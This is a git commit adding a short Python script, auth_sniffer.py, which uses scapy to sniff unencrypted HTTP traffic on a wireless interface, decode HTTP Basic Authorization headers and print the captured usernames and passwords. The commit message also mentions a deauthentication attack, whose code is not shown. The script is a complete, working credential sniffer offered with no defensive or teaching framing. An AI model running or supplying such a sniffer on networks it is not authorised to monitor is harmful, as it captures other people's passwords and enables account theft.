f3d2072a7fa4ab11a357f25020ed288a8e7182ed
hamdifourati <mercilesshamdi@gmail.com>
2017-04-12 23:31:48 +0100

    implemented deauth attack && Basic HTTP Authentication sniffer

---
+++ src/auth_sniffer.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python
+
+import re
+from base64 import b64decode
+
+from scapy.all import sniff
+
+dev = "wlan0"
+
+
+def handle_packet(pkt):
+    tcp = pkt.getlayer("TCP")
+    match = re.search(r"Authorization: Basic (.+)", str(tcp.payload))
+    print str(tcp.payload)
+
+    if match:
+        auth_str = b64decode(match.group(1))
+        auth = auth_str.split(":")
+        print "User:", auth[0], "Pass: ", auth[1]
+
+sniff(iface=dev, store=0, filter="tcp and port 80", prn=handle_packet)
